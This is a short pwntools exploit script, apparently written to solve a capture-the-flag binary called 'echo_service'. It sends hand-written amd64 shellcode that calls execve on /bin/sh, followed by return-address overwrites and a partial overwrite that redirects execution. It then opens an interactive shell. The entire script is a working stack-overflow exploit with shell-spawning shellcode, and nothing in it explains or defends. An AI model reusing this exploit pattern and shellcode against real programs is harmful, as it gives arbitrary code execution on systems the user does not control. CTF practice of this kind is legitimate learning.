from pwn import *
p=process("./echo_service")

gdb.attach(p)
p.readuntil("age : ")
context.log_level='debug'
context.arch='amd64'
ret=0x00000000004000e4
shellcode='''
mov al,59
mov rsi,0x0068732f6e69622f
push rsi
mov rdi,rsp
xor rdx,rdx
xor rsi,rsi
syscall
'''
shellcode=asm(shellcode)
p.send(shellcode.ljust(0x20,'\x00')+p64(ret)*2+"\x68\xdd")
p.interactive()
#0x7fffffffde88
